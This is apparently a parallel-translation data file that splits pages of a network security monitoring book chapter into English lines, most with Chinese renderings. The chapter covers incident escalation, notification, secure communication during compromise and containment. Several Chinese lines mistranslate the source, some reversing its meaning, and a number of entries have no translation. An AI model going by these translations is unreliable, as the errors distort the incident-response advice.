  type: TYPE_NORMAL
- en: classify all incidents that affect their constituents. Counting and classifying
  id: totrans-588
  prefs: []
  type: TYPE_NORMAL
- en: incidents creates one of the two key metrics any CIRT must collect. (The
  id: totrans-589
  prefs: []
  type: TYPE_NORMAL
- en: second key metric is the time elapsed from incident detection to contain-
  id: totrans-590
  prefs: []
  type: TYPE_NORMAL
- en: ment, as discussed in “Resolution” o[n page 198\.](#p232) ) The definitions
    do not need to conform to any international standard, but they must be internally
  id: totrans-591
  prefs: []
  type: TYPE_NORMAL
- en: consistent.
  id: totrans-592
  prefs: []
  type: TYPE_NORMAL
- en: That said, if a CIRT wants to contribute data to an incident-reporting
  id: totrans-593
  prefs: []
  type: TYPE_NORMAL
- en: project, the CIRT must align its incident definitions with that of the outside
  id: totrans-594
  prefs: []
  type: TYPE_NORMAL
- en: body. Whether reporting internally or externally, CIRTs should be able to
  id: totrans-595
  prefs: []
  type: TYPE_NORMAL
- en: produce regular reports on the number and types of incidents per unit
  id: totrans-596
  prefs: []
  type: TYPE_NORMAL
- en: time, such as per quarter or per year. What the organization does with the
  id: totrans-597
  prefs: []
  type: TYPE_NORMAL
- en: output of the analysis process is the topic of the next section.
  id: totrans-598
  prefs: []
  type: TYPE_NORMAL
- en: '***Escalation***'
  id: totrans-599
  prefs: []
  type: TYPE_NORMAL
- en: Escalation refers to the process the CIRT uses to document its findings,
  id: totrans-600
  prefs: []
  type: TYPE_NORMAL
- en: notify its constituents, and receive acknowledgment from the constituents
  id: totrans-601
  prefs: []
  type: TYPE_NORMAL
- en: of the incident report. Escalation may seem like an afterthought, unwor-
  id: totrans-602
  prefs: []
  type: TYPE_NORMAL
- en: thy of its own section, but in large and/or distributed environments, esca-
  id: totrans-603
  prefs: []
  type: TYPE_NORMAL
- en: lation is one of the most difficult aspects of the NSM process.
  id: totrans-604
  prefs: []
  type: TYPE_NORMAL
- en: '**Documentation of Incidents**'
  id: totrans-605
  prefs: []
  type: TYPE_NORMAL
- en: Documentation creates a record of an event, as well as the CIRT’s work to
  id: totrans-606
  prefs: []
  type: TYPE_NORMAL
- en: handle that event. It’s important to assign a single incident number to each
  id: totrans-607
  prefs: []
  type: TYPE_NORMAL
- en: victim computer. (Consider exploited applications to be computers for the
  id: totrans-608
  prefs: []
  type: TYPE_NORMAL
- en: purposes of this exercise.) Do not assign multiple compromised computers to
  id: totrans-609
  prefs: []
  type: TYPE_NORMAL
- en: a single incident number, unless you use a different term for a single compro-
  id: totrans-610
  prefs: []
  type: TYPE_NORMAL
- en: mised computer. For example, some CIRTs call a single victim a *compromise*,
  id: totrans-611
  prefs: []
  type: TYPE_NORMAL
- en: and one or more compromised computers an *incident*. The point is to use a
  id: totrans-612
  prefs: []
  type: TYPE_NORMAL
- en: granular term that applies to a single victim computer; without such detail,
    it
  id: totrans-613
  prefs: []
  type: TYPE_NORMAL
- en: becomes impossible to collect and measure incident response metrics.
  id: totrans-614
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **195**
  id: totrans-615
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-616
  prefs: []
  type: TYPE_NORMAL
- en: Organizations will choose to incorporate different levels of detail into their
    incident reports. For example, CIRTs handling hundreds or thousands
  id: totrans-617
  prefs: []
  type: TYPE_NORMAL
- en: of incidents per year will likely capture the essential details of a victim
    system,
  id: totrans-618
  prefs: []
  type: TYPE_NORMAL
- en: while those working with fewer incidents might document in more detail.
  id: totrans-619
  prefs: []
  type: TYPE_NORMAL
- en: When possible, consider documenting incidents using a community
  id: totrans-620
  prefs: []
  type: TYPE_NORMAL
- en: standard like the Vocabulary for Event Recording and Incident Sharing
  id: totrans-621
  prefs: []
  type: TYPE_NORMAL
- en: (VERIS). VERIS provides a common language for describing security inci-
  id: totrans-622
  prefs: []
  type: TYPE_NORMAL
  zh: (VERIS)。VERIS提供了描述安全事件的通用语言。
- en: dents consistently. You’ll find examples of how to document incidents of
  id: totrans-623
  prefs: []
  type: TYPE_NORMAL
  zh: 一致地记录安全事件。你会找到如何记录安全事件的例子。
- en: various types posted at the VERIS project site ( *http://veriscommunity.net/*).
  id: totrans-624
  prefs: []
  type: TYPE_NORMAL
  zh: 各种类型可以在VERIS项目网站上找到（*http://veriscommunity.net/*）。
- en: '**Notification of Incidents**'
  id: totrans-625
  prefs: []
  type: TYPE_NORMAL
  zh: '**事件通知**'
- en: Notification is the next step in the escalation process. It requires you to
  id: totrans-626
  prefs: []
  type: TYPE_NORMAL
  zh: 通知是升级流程中的下一步。它要求你
- en: identify the compromised asset, find a person or group responsible for the
  id: totrans-627
  prefs: []
  type: TYPE_NORMAL
  zh: 确定受损资产，找到负责的人员或团队，
- en: victim, and deliver an incident report to the affected party. The process
  id: totrans-628
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者，并将事件报告交给受影响的方。该过程
- en: may sound easy, but it can be exceptionally difficult when working with
  id: totrans-629
  prefs: []
  type: TYPE_NORMAL
  zh: 听起来简单，但在处理
- en: large or distributed networks due to the generally poor state of inventory
  id: totrans-630
  prefs: []
  type: TYPE_NORMAL
  zh: 在大规模或分布式网络中，由于清单管理普遍较差，
- en: management and network visibility that afflicts many organizations.
  id: totrans-631
  prefs: []
  type: TYPE_NORMAL
  zh: 许多组织面临的管理和网络可见性问题。
- en: '**whaT iS a DefeNSiBle NeT work archiTecTure?**'
  id: totrans-632
  prefs: []
  type: TYPE_NORMAL
  zh: '**什么是可防御的网络架构？**'
- en: Identifying a compromised asset, finding a responsible owner, and delivering
    an
  id: totrans-633
  prefs: []
  type: TYPE_NORMAL
  zh: 确定受损资产，找到负责的所有者，并交付
- en: incident report are three of the toughest jobs in security, but they are not
    the only chal enges . I developed a *defensible network architecture* to explain
    the characteristics of organizations whose network offers the greatest overall
    security ( *ht p://*
  id: totrans-634
  prefs: []
  type: TYPE_NORMAL
  zh: 事件报告是安全领域最具挑战性的工作之一，但它们并非唯一的挑战。我开发了一种*可防御的网络架构*，以解释那些网络提供最大整体安全性的组织的特点（*http://*）。
- en: '*taosecurity.blogspot.com/2008/01/defensible-network-architecture-20 .html*
    ) . The list starts with the characteristics a security team should adopt first,
    and as it continues, the elements become progressively more difficult to implement
    .'
  id: totrans-635
  prefs: []
  type: TYPE_NORMAL
  zh: '*taosecurity.blogspot.com/2008/01/defensible-network-architecture-20.html*）这个清单从安全团队应该首先采取的特性开始，随着清单的推进，元素变得越来越难以实现。'
- en: monitored CIRTs can view all assets at the host, network, and application
  id: totrans-636
  prefs: []
  type: TYPE_NORMAL
  zh: 监控的CIRT可以查看所有主机、网络和应用层面的资产。
- en: log levels .
  id: totrans-637
  prefs: []
  type: TYPE_NORMAL
  zh: 日志级别。
- en: Inventoried CIRTs can access an inventory identifying asset location, purpose,
  id: totrans-638
  prefs: []
  type: TYPE_NORMAL
  zh: 列出的CIRT可以访问识别资产位置、用途和
- en: data classification, criticality, owner, and contact method .
  id: totrans-639
  prefs: []
  type: TYPE_NORMAL
  zh: 数据分类、重要性、所有者和联系方式。
- en: control ed The security team enforces access control at the host, network, and
  id: totrans-640
  prefs: []
  type: TYPE_NORMAL
  zh: 控制了安全团队在主机、网络和
- en: application levels to permit authorized activities and deny everything else
    .
  id: totrans-641
  prefs: []
  type: TYPE_NORMAL
  zh: 应用级别应允许授权活动并拒绝其他所有活动。
- en: claimed The asset owner listed in the inventory exerts active control of the
    system .
  id: totrans-642
  prefs: []
  type: TYPE_NORMAL
  zh: 声明资产所有者在清单中列出，负责系统的积极控制。
- en: minimized The assets provide the minimum surface area required to perform
  id: totrans-643
  prefs: []
  type: TYPE_NORMAL
  zh: 最小化了资产提供执行所需的最小表面面积。
- en: their business function; unnecessary services, protocols, and software are disabled
    .
  id: totrans-644
  prefs: []
  type: TYPE_NORMAL
  zh: 他们的业务功能；不必要的服务、协议和软件被禁用。
- en: assessed The CIRT routinely evaluates the configuration of the assets to deter-
  id: totrans-645
  prefs: []
  type: TYPE_NORMAL
  zh: 评估的CIRT定期评估资产配置，以防范安全风险。
- en: mine their security posture .
  id: totrans-646
  prefs: []
  type: TYPE_NORMAL
  zh: 他们的安全姿态。
- en: current The IT team keeps the assets patch status and configuration up-to-date
  id: totrans-647
  prefs: []
  type: TYPE_NORMAL
  zh: 当前，IT团队保持资产的补丁状态和配置是最新的。
- en: with the latest standards .
  id: totrans-648
  prefs: []
  type: TYPE_NORMAL
  zh: 使用最新的标准。
- en: measured The IT team and CIRT measure their progress against the previous
  id: totrans-649
  prefs: []
  type: TYPE_NORMAL
  zh: 测量了IT团队和CIRT根据之前的进度进行评估。
- en: steps .
  id: totrans-650
  prefs: []
  type: TYPE_NORMAL
  zh: 步骤。
- en: Organizations that adopt a defensible network architecture are best posi-
  id: totrans-651
  prefs: []
  type: TYPE_NORMAL
  zh: 采用可防御的网络架构的组织处于最佳位置，
- en: tioned to resist compromise and to respond effectively to intrusions as they
    occur .
  id: totrans-652
  prefs: []
  type: TYPE_NORMAL
  zh: 提到的目标是抵抗妥协，并在入侵发生时有效响应。
- en: '**196** Chapter 9'
  id: totrans-653
  prefs: []
  type: TYPE_NORMAL
  zh: '**196** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-654
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Notification is impossible if the CIRT cannot map an IP address or
  id: totrans-655
  prefs: []
  type: TYPE_NORMAL
  zh: 如果CIRT无法映射IP地址或
- en: hostname to a real computer, determine its owner, and contact the owner.
  id: totrans-656
  prefs: []
  type: TYPE_NORMAL
  zh: 主机名指向真实计算机，确定其所有者，并联系所有者。
- en: If any of these steps fail, the incident remains unreported and the network
  id: totrans-657
  prefs: []
  type: TYPE_NORMAL
  zh: 如果这些步骤中的任何一步失败，事件将无法报告，网络
- en: at risk.
  id: totrans-658
  prefs: []
  type: TYPE_NORMAL
  zh: 风险。
- en: Notification also depends on the risk posed by a particular incident.
  id: totrans-659
  prefs: []
  type: TYPE_NORMAL
  zh: 通知也取决于特定事件所带来的风险。
- en: For example, communications about a Cat 2 incident (unauthorized user-
  id: totrans-660
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，关于Cat 2事件（未经授权的用户访问）的通讯，
- en: level access) should probably not carry the urgency of communications
  id: totrans-661
  prefs: []
  type: TYPE_NORMAL
  zh: 级别访问）可能不应具有与通讯紧急性相关的要求。
- en: about a Breach 2 incident (intruder has stolen sensitive data).
  id: totrans-662
  prefs: []
  type: TYPE_NORMAL
  zh: 关于Breach 2事件（入侵者窃取了敏感数据）的通讯，
- en: Regardless, all reporting should be in accord with the standard inci-
  id: totrans-663
  prefs: []
  type: TYPE_NORMAL
  zh: 无论如何，所有报告都应符合标准事件
- en: dent management platform used by the CIRT, but the CIRT and constituents
  id: totrans-664
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT 使用的事件管理平台，但 CIRT 和相关方
- en: should agree to different expected response times based on the severity of
  id: totrans-665
  prefs: []
  type: TYPE_NORMAL
  zh: 应根据事件的严重性同意不同的预期响应时间。
- en: incidents. If an incident is urgent, use the telephone or instant messaging;
  id: totrans-666
  prefs: []
  type: TYPE_NORMAL
  zh: 事件。如果事件紧急，使用电话或即时消息；
- en: time is a crucial component in that case. Be sure that everyone understands
  id: totrans-667
  prefs: []
  type: TYPE_NORMAL
  zh: 时间是关键因素之一。确保每个人都理解
- en: how to communicate about incidents and practice the process of notifica-
  id: totrans-668
  prefs: []
  type: TYPE_NORMAL
  zh: 如何沟通事件并实践通知过程，
- en: tion regularly. At the same time, form backup notification plans in case the
  id: totrans-669
  prefs: []
  type: TYPE_NORMAL
  zh: 定期进行通知。同时，制定备份通知计划，以防万一
- en: primary contacts are unresponsive.
  id: totrans-670
  prefs: []
  type: TYPE_NORMAL
  zh: 主要联系人没有回应。
- en: Acknowledgment of the incident report is the final step in the escala-
  id: totrans-671
  prefs: []
  type: TYPE_NORMAL
  zh: 确认事件报告是升级过程中的最后一步，
- en: tion phase, but this step can be a challenge because some constituents
  id: totrans-672
  prefs: []
  type: TYPE_NORMAL
  zh: 阶段，但这一步骤可能是一个挑战，因为一些相关方
- en: don’t care to know that their computers are compromised (or they’re just
  id: totrans-673
  prefs: []
  type: TYPE_NORMAL
  zh: 不关心他们的计算机是否被入侵（或者他们只是
- en: swamped with other work). Others have no IT or security abilities whatso-
  id: totrans-674
  prefs: []
  type: TYPE_NORMAL
  zh: 被其他工作压得喘不过气）。有些人根本没有 IT 或安全能力，
- en: ever and may depend completely on the CIRT for the next steps. Whatever
  id: totrans-675
  prefs: []
  type: TYPE_NORMAL
  zh: 无论如何，可能完全依赖 CIRT 执行接下来的步骤。无论
- en: the case, track the acknowledgment time and method in whatever system
  id: totrans-676
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，跟踪确认时间和方法，在任何系统中
- en: you use to manage incident reporting to help improve the overall security
  id: totrans-677
  prefs: []
  type: TYPE_NORMAL
  zh: 你用来管理事件报告的工具有助于提高整体安全性
- en: process.
  id: totrans-678
  prefs: []
  type: TYPE_NORMAL
  zh: 过程。
- en: '**Incident Communication Considerations**'
  id: totrans-679
  prefs: []
  type: TYPE_NORMAL
  zh: '**事件沟通考虑事项**'
- en: Organizations compromised by persistent threats should assume that the
  id: totrans-680
  prefs: []
  type: TYPE_NORMAL
  zh: 被持续威胁攻陷的组织应假设
- en: adversary has access to their email. Reading CIRT and security team mes-
  id: totrans-681
  prefs: []
  type: TYPE_NORMAL
  zh: 对手已经访问了他们的电子邮件。阅读 CIRT 和安全团队的消息
- en: sages is a favorite attacker pastime. Unfortunately, email is often the least
  id: totrans-682
  prefs: []
  type: TYPE_NORMAL
  zh: 消息是攻击者的最爱活动。不幸的是，电子邮件往往是最
- en: common denominator when it comes to enterprise communication. Large,
  id: totrans-683
  prefs: []
  type: TYPE_NORMAL
  zh: 企业通信中的常见元素。大型，
- en: distributed organizations may have different chat applications, collabora-
  id: totrans-684
  prefs: []
  type: TYPE_NORMAL
  zh: 分布式组织可能使用不同的聊天应用程序、协作
- en: tion platforms, or other forms of communication, but most everyone has
  id: totrans-685
  prefs: []
  type: TYPE_NORMAL
  zh: 通信平台或其他形式的通信，但几乎每个人都有
- en: an email address that they monitor closely. Make sure to encrypt sensi-
  id: totrans-686
  prefs: []
  type: TYPE_NORMAL
  zh: 一个他们密切关注的电子邮件地址。确保加密敏感
- en: tive CIRT-to-constituent email conversations and exchange truly sensitive
  id: totrans-687
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT 和相关方之间具有启发性的电子邮件对话并交换真正敏感的
- en: information by phone. If you suspect that an attacker has penetrated
  id: totrans-688
  prefs: []
  type: TYPE_NORMAL
  zh: 通过电话获取信息。如果你怀疑攻击者已渗透
- en: your Voice over IP Protocol (VoIP) network, use cell phones. The same
  id: totrans-689
  prefs: []
  type: TYPE_NORMAL
  zh: 你的语音 over IP 协议（VoIP）网络，使用手机。相同
- en: goes for corporate-hosted real-time chat systems and other collaboration
  id: totrans-690
  prefs: []
  type: TYPE_NORMAL
  zh: 适用于企业托管的实时聊天系统和其他协作平台。
- en: platforms.
  id: totrans-691
  prefs: []
  type: TYPE_NORMAL
  zh: 平台。
- en: Many compromised organizations choose to communicate via email
  id: totrans-692
  prefs: []
  type: TYPE_NORMAL
  zh: 许多被攻陷的组织选择通过电子邮件进行沟通
- en: using something like Gmail or another provider in order to avoid their
  id: totrans-693
  prefs: []
  type: TYPE_NORMAL
  zh: 使用像 Gmail 这样的服务，或其他供应商，以避免他们的
- en: compromised systems. Stress-test these response activities before detecting
  id: totrans-694
  prefs: []
  type: TYPE_NORMAL
  zh: 被攻陷的系统。需要在检测到之前对这些响应活动进行压力测试。
- en: a serious incident.
  id: totrans-695
  prefs: []
  type: TYPE_NORMAL
  zh: 一起对待一个严重事件。
- en: Now that the CIRT and constituents are communicating about an inci-
  id: totrans-696
  prefs: []
  type: TYPE_NORMAL
  zh: 现在 CIRT 和相关方正在就一个事件进行沟通，
- en: dent, the final phase turns to doing something to mitigate the risk of loss.
  id: totrans-697
  prefs: []
  type: TYPE_NORMAL
  zh: 事件发生后，最后阶段是采取措施减少损失风险。
- en: NSM Operations **197**
  id: totrans-698
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 操作 **197**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-699
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Resolution***'
  id: totrans-700
  prefs: []
  type: TYPE_NORMAL
  zh: '***解决方案***'
- en: Resolution refers to the process CIRTs and constituents use to transition
  id: totrans-701
  prefs: []
  type: TYPE_NORMAL
  zh: 解决方案指的是 CIRT 和相关方用来将系统从
- en: compromised systems from an at-risk state to a trustworthy state. The actual
  id: totrans-702
  prefs: []
  type: TYPE_NORMAL
  zh: 从风险状态到可信状态的系统恢复。实际的
- en: transition process takes many forms, depending on the nature of the inci-
  id: totrans-703
  prefs: []
  type: TYPE_NORMAL
  zh: 过渡过程有很多种形式，取决于事件的性质，
- en: dent, as well as the capabilities and risk tolerance of the CIRT and constitu-
  id: totrans-704
  prefs: []
  type: TYPE_NORMAL
  zh: 事件及 CIRT 和相关方的能力和风险承受能力，
- en: ents. Each party must balance the risk of data loss, alteration, or denial
  id: totrans-705
  prefs: []
  type: TYPE_NORMAL
  zh: 事件。每一方必须平衡数据丢失、篡改或拒绝服务的风险，
- en: of service against the business requirement of the compromised assets.
  id: totrans-706
  prefs: []
  type: TYPE_NORMAL
  zh: 服务中断对被攻陷资产的业务需求。
- en: Frequently, the CIRT will want the compromised computer off the network
  id: totrans-707
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT 通常希望将被攻陷的计算机从网络中断开
- en: as quickly as possible, while the business owner will want it online no matter
  id: totrans-708
  prefs: []
  type: TYPE_NORMAL
  zh: 尽可能迅速地恢复，而业务负责人则希望它无论如何都能在线
- en: what the cost.
  id: totrans-709
  prefs: []
  type: TYPE_NORMAL
  zh: 无论成本如何。
- en: When resolving incidents, consider establishing *risk-mitigation guidelines*.
  id: totrans-710
  prefs: []
  type: TYPE_NORMAL
  zh: 解决事件时，可以考虑制定*风险缓解指南*。
- en: When any asset is compromised, the constituent must take at least one mea-
  id: totrans-711
  prefs: []
  type: TYPE_NORMAL
  zh: 当任何资产被破坏时，相关人员必须采取至少一个措施，
- en: sure to reduce risk of data loss, alteration, or denial of service, depending
  id: totrans-712
  prefs: []
  type: TYPE_NORMAL
  zh: 确保减少数据丢失、篡改或拒绝服务的风险，具体取决于
- en: on the nature of the incident. Taking no action is not an option. Tolerating
  id: totrans-713
  prefs: []
  type: TYPE_NORMAL
  zh: 根据事件的性质，采取行动不是一种选择。容忍
- en: an intruder on the network is at best poor practice and at worst an invita-
  id: totrans-714
  prefs: []
  type: TYPE_NORMAL
  zh: 网络上的入侵者最好的做法是，最糟糕的情况是邀请
- en: tion for a lawsuit or other penalty.
  id: totrans-715
  prefs: []
  type: TYPE_NORMAL
  zh: 诉讼或其他处罚的风险。
- en: '**Containment techniques**'
  id: totrans-716
  prefs: []
  type: TYPE_NORMAL
  zh: '**遏制技术**'
- en: The CIRT and constituents should devise a hierarchy of possible risk-
  id: totrans-717
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT和相关方应制定可能的风险缓解层级
- en: mitigation tactics. These response options focus on containing intruders
  id: totrans-718
  prefs: []
  type: TYPE_NORMAL
  zh: 缓解策略。这些响应选项专注于遏制入侵者
- en: and limiting their freedom to interact with victim computers, or pivot from
  id: totrans-719
  prefs: []
  type: TYPE_NORMAL
  zh: 并限制他们与受害计算机的互动自由，或从
- en: a victim computer to yet another victim.
  id: totrans-720
  prefs: []
  type: TYPE_NORMAL
  zh: 将受害计算机转移到另一个受害者计算机上。
- en: When containing an intruder, begin with the victimized computer and
  id: totrans-721
  prefs: []
  type: TYPE_NORMAL
  zh: 遏制入侵者时，从受害计算机开始，并
- en: 'consider the following possibilities:'
  id: totrans-722
  prefs: []
  type: TYPE_NORMAL
  zh: 可以考虑以下几种可能性：
- en: • Put the computer in hibernate mode. (Don’t turn it off; you will lose
  id: totrans-723
  prefs: []
  type: TYPE_NORMAL
  zh: • 将计算机置于休眠模式。（不要关闭它；你会失去
- en: valuable volatile data in memory.)
  id: totrans-724
  prefs: []
  type: TYPE_NORMAL
  zh: 在内存中存储宝贵的易变数据。）
- en: • Shut down the port the computer uses to accesses the network.
  id: totrans-725
  prefs: []
  type: TYPE_NORMAL
  zh: • 关闭计算机用于访问网络的端口。
- en: • Implement a local firewall rule or kernel-level filter to deny the com-
  id: totrans-726
  prefs: []
  type: TYPE_NORMAL
  zh: • 实施本地防火墙规则或内核级过滤器，禁止计算机
- en: puter the ability to communicate with other computers.
  id: totrans-727
  prefs: []
  type: TYPE_NORMAL
  zh: 给计算机提供与其他计算机通信的能力。
- en: • Implement an access control list entry to prevent the computer from
  id: totrans-728
  prefs: []
  type: TYPE_NORMAL
  zh: • 实施访问控制列表条目，防止计算机
- en: communicating with other computers.
  id: totrans-729
  prefs: []
  type: TYPE_NORMAL
  zh: 与其他计算机通信。
- en: • Implement a routing change to prevent the computer from communi-
  id: totrans-730
  prefs: []
  type: TYPE_NORMAL
  zh: • 实施路由更改，防止计算机与其他计算机
- en: cating with other computers.
  id: totrans-731
  prefs: []
  type: TYPE_NORMAL
  zh: 与其他计算机进行通信。
- en: • Implement a firewall or proxy block to deny the computer access to the
  id: totrans-732
  prefs: []
  type: TYPE_NORMAL
  zh: • 实施防火墙或代理阻止，禁止计算机访问
- en: Internet, which will cut off remote command-and-control channels.
  id: totrans-733
  prefs: []
  type: TYPE_NORMAL
  zh: 互联网，这将切断远程命令与控制通道。
- en: More advanced CIRTs will have other tricks up their sleeves, such as
  id: totrans-734
  prefs: []
  type: TYPE_NORMAL
  zh: 更先进的CIRT将拥有其他手段，例如
- en: transitioning the intruder to a honey network of simulated computers for
  id: totrans-735
  prefs: []
  type: TYPE_NORMAL
  zh: 将入侵者转移到一个模拟计算机的蜜罐网络中，以供
- en: study in a “safe” environment. (A honey network is a collection of computers
  id: totrans-736
  prefs: []
  type: TYPE_NORMAL
  zh: 在一个“安全”的环境中进行研究。（蜜罐网络是由计算机组成的一个集合，
- en: deployed by a CIRT to entice, trap, and observe intruders.) Whatever the
  id: totrans-737
  prefs: []
  type: TYPE_NORMAL
  zh: 由CIRT部署，用于引诱、陷阱和观察入侵者。）无论具体
- en: choice of action, key to this process is ensuring that the CIRT and constitu-
  id: totrans-738
  prefs: []
  type: TYPE_NORMAL
  zh: 行动选择，关键是确保CIRT和相关方
- en: ent take some action to reduce risk of loss.
  id: totrans-739
  prefs: []
  type: TYPE_NORMAL
  zh: 有限地采取措施以减少丢失风险。
- en: '**198** Chapter 9'
  id: totrans-740
  prefs: []
  type: TYPE_NORMAL
  zh: '**198** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-741
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Speed of Containment**'
  id: totrans-742
  prefs: []
  type: TYPE_NORMAL
  zh: '**遏制速度**'
- en: The speed with which a CIRT and constituent take containment actions is
  id: totrans-743
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT和相关方采取遏制行动的速度是
- en: the subject of hot debate in the security world. Some argue for fast contain-
  id: totrans-744
  prefs: []
  type: TYPE_NORMAL
  zh: 这是安全界的热门争议话题。有些人主张快速遏制，
- en: ment in order to limit risk; others argue for slower containment, providing
  id: totrans-745
  prefs: []
  type: TYPE_NORMAL
  zh: 限制风险的措施；其他人主张较慢的遏制，提供
- en: more time to learn about an adversary. The best answer is to contain inci-
  id: totrans-746
  prefs: []
  type: TYPE_NORMAL
  zh: 更多时间去了解对手。最佳答案是遏制事件，
- en: dents as quickly as possible, as long as the CIRT can scope the incident to
  id: totrans-747
  prefs: []
  type: TYPE_NORMAL
  zh: 尽可能快速地处理事件，只要CIRT能将事件范围限定在
- en: the best of its capability.
  id: totrans-748
  prefs: []
  type: TYPE_NORMAL
  zh: 以最佳能力执行其任务。
- en: '*Scoping the incident* means understanding the intruder’s reach. Is he lim-'
  id: totrans-749
  prefs: []
  type: TYPE_NORMAL
  zh: '*限定事件范围*意味着了解入侵者的渗透范围。他是仅限于'
- en: ited to interacting with only the one computer identified thus far? Does he
  id: totrans-750
  prefs: []
  type: TYPE_NORMAL
  zh: 是否仅限于与目前识别的唯一计算机互动？他
- en: control more computers, or even the entire network by virtue of exploita-
  id: totrans-751
  prefs: []
  type: TYPE_NORMAL
  zh: 通过利用漏洞控制更多的计算机，甚至整个网络。
- en: tion of the Active Directory domain controllers?
  id: totrans-752
  prefs: []
  type: TYPE_NORMAL
  zh: 是否破坏了Active Directory域控制器？
- en: The speed with which a CIRT can make the containment decision is one
  id: totrans-753
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT做出遏制决策的速度是一个
- en: of the primary ways to measure its maturity. If the CIRT regularly learns of
  id: totrans-754
  prefs: []
  type: TYPE_NORMAL
  zh: 这是衡量其成熟度的主要方式之一。如果CIRT定期了解
- en: the presence of advanced (or even routine) threats via notification by exter-
  id: totrans-755
  prefs: []
  type: TYPE_NORMAL
  zh: 通过外部通知，识别先进（或甚至常规）威胁的存在
- en: nal parties, then rapid containment is less likely to be effective. A CIRT that
  id: totrans-756
  prefs: []
  type: TYPE_NORMAL
  zh: 若CIRT与相关方在决策时花费更多时间，转而采取快速遏制将不太有效。
- en: cannot find intrusions within its own environment is not likely to be able to
  id: totrans-757
  prefs: []
  type: TYPE_NORMAL
- en: rapidly scope an incident. “Pulling the plug” on the first identified victim
    will
  id: totrans-758
  prefs: []
  type: TYPE_NORMAL
- en: probably leave dozens, hundreds, or thousands of other victims online and
  id: totrans-759
  prefs: []
  type: TYPE_NORMAL
- en: available to the adversary.
  id: totrans-760
  prefs: []
  type: TYPE_NORMAL
- en: On the other hand, if the CIRT develops its own threat intelligence,
  id: totrans-761
  prefs: []
  type: TYPE_NORMAL
- en: maintains pervasive visibility, and quickly finds intruders on its own, it is
  id: totrans-762
  prefs: []
  type: TYPE_NORMAL
- en: more likely to be able to scope an incident in a minimum amount of time.
  id: totrans-763
  prefs: []
  type: TYPE_NORMAL
- en: CIRTs with that sort of capability should establish the intruder’s reach as
  id: totrans-764
  prefs: []
  type: TYPE_NORMAL
- en: rapidly as possible, and then just as quickly contain the victim(s) to limit
  id: totrans-765
  prefs: []
  type: TYPE_NORMAL
- en: the adversary’s options.
  id: totrans-766
  prefs: []
  type: TYPE_NORMAL
- en: Deciding which containment action to take can be tricky. One way to
  id: totrans-767
  prefs: []
  type: TYPE_NORMAL
- en: decide is to adopt either a threat-centric or an asset-centric approach to
  id: totrans-768
  prefs: []
  type: TYPE_NORMAL
- en: defending information resources.
  id: totrans-769
  prefs: []
  type: TYPE_NORMAL
- en: A *threat-centric* approach focuses on the presumed nature of the adver-
  id: totrans-770
  prefs: []
  type: TYPE_NORMAL
- en: sary. A mature CIRT will likely track many distinct threat groups, and rec-
  id: totrans-771
  prefs: []
  type: TYPE_NORMAL
- en: ognize when a more sophisticated or damaging threat compromises one
  id: totrans-772
  prefs: []
  type: TYPE_NORMAL
- en: or more computers. When the CIRT detects that a threat group is active in
  id: totrans-773
  prefs: []
  type: TYPE_NORMAL
- en: the environment, the CIRT will likely act quickly to contain the adversary.
  id: totrans-774
  prefs: []
  type: TYPE_NORMAL
- en: If the CIRT instead notices a more routine event involving a criminal actor,
  id: totrans-775
  prefs: []
  type: TYPE_NORMAL
- en: the CIRT may take a more leisurely response.
  id: totrans-776
  prefs: []
  type: TYPE_NORMAL
- en: An *asset-centric* approach focuses on the presumed nature of the victim
  id: totrans-777
  prefs: []
  type: TYPE_NORMAL
- en: computer. A CIRT working with a mature IT and business organization
  id: totrans-778
  prefs: []
  type: TYPE_NORMAL
- en: will understand the sensitivity of the data on its networks and the roles of
  id: totrans-779
  prefs: []
  type: TYPE_NORMAL
- en: systems processing that data. When the CIRT detects an incident affecting
  id: totrans-780
  prefs: []
  type: TYPE_NORMAL
- en: a business-essential asset, the CIRT acts quickly. If the CIRT instead notices
  id: totrans-781
  prefs: []
  type: TYPE_NORMAL
- en: activity affecting a less important asset, such as an employee laptop, the
  id: totrans-782
  prefs: []
  type: TYPE_NORMAL
- en: CIRT acts less quickly. Some CIRTs take a hybrid approach, weighing the
  id: totrans-783
  prefs: []
  type: TYPE_NORMAL
- en: relative nature of the threat actor and the affected asset.
  id: totrans-784
  prefs: []
  type: TYPE_NORMAL
- en: CIRTs should document their processes in *playbooks* that outline the
  id: totrans-785
  prefs: []
  type: TYPE_NORMAL
- en: responsibilities and actions to be taken by CIRTs and constituents. CIRTs
  id: totrans-786
  prefs: []
  type: TYPE_NORMAL
- en: should also track intruder activity differently, depending on the nature of
  id: totrans-787
  prefs: []
  type: TYPE_NORMAL
- en: the threat. For example, mature CIRTs opposing the APT and aggressive
  id: totrans-788
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **199**
  id: totrans-789
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-790
  prefs: []
  type: TYPE_NORMAL
- en: '**how To Tr ack waveS aND caMPaigNS**'
  id: totrans-791
  prefs: []
  type: TYPE_NORMAL
- en: Although CIRTs should assign numbers of some sort to incidents (such as
  id: totrans-792
  prefs: []
  type: TYPE_NORMAL
- en: 201305180006, for the sixth incident on the 18th of May, 2013), I recommend
  id: totrans-793
  prefs: []
  type: TYPE_NORMAL
